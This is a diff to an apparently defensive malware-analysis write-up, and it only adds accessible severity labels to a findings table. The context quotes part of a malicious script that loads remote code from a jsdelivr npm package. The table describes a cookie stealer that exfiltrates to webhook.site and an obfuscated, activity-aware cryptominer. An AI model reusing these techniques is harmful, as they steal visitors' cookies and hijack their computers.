@@ -52,16 +52,16 @@ window._axiosExfil=<span class="tok-kw">function</span>(){
 script.src=<span class="tok-str">'https://cdn.jsdelivr.net/npm/v018-axios-cdntest@1.0.2/index.js'</span>;
 </code></pre>
 
-| | File | Trait | Evidence |
+| <span class="visually-hidden">Severity</span> | File | Trait | Evidence |
 | --- | --- | --- | --- |
-| <span class="sev-dot hostile" title="hostile"></span> | `xmr-min.js` | `objectives/impact/cryptojacking/miner/context` | "cryptonight" + `Worker` strings (string match, not real crypto) |
-| <span class="sev-dot hostile" title="hostile"></span> | `index.js` | `objectives/collection/stealer/browser` | `document.cookie` read and exfiltrated |
-| <span class="sev-dot hostile" title="hostile"></span> | `index.js` | `objectives/exfiltration/http/query` | Cookie sent as a URL query parameter |
-| <span class="sev-dot hostile" title="hostile"></span> | `xmr-min.js` | `objectives/impact/cryptojacking/miner/smart` | Activity-aware miner; pauses on `document.hidden` |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `xmr-min.js` | `objectives/anti-static/obfuscation/encoding/content` | Worker built from a `Blob` via encoded `eval()` |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `index.js` | `objectives/evasion/masquerade/traffic` | POST mislabeled `application/x-www-form-urlencoded` |
-| <span class="sev-dot notable" title="notable"></span> | `index.js` | `objectives/exfiltration/oob/endpoint` | webhook.site out-of-band collector |
-| <span class="sev-dot notable" title="notable"></span> | `xmr-min.js` | `micro-behaviors/communications/http/client/cdn` | Script loaded from `cdn.jsdelivr.net` |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `xmr-min.js` | `objectives/impact/cryptojacking/miner/context` | "cryptonight" + `Worker` strings (string match, not real crypto) |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `index.js` | `objectives/collection/stealer/browser` | `document.cookie` read and exfiltrated |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `index.js` | `objectives/exfiltration/http/query` | Cookie sent as a URL query parameter |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `xmr-min.js` | `objectives/impact/cryptojacking/miner/smart` | Activity-aware miner; pauses on `document.hidden` |
+| <span class="sev-dot suspicious" aria-hidden="true"></span>suspicious | `xmr-min.js` | `objectives/anti-static/obfuscation/encoding/content` | Worker built from a `Blob` via encoded `eval()` |
+| <span class="sev-dot suspicious" aria-hidden="true"></span>suspicious | `index.js` | `objectives/evasion/masquerade/traffic` | POST mislabeled `application/x-www-form-urlencoded` |
+| <span class="sev-dot notable" aria-hidden="true"></span>notable | `index.js` | `objectives/exfiltration/oob/endpoint` | webhook.site out-of-band collector |
+| <span class="sev-dot notable" aria-hidden="true"></span>notable | `xmr-min.js` | `micro-behaviors/communications/http/client/cdn` | Script loaded from `cdn.jsdelivr.net` |
 
 ## The operator's manual
 
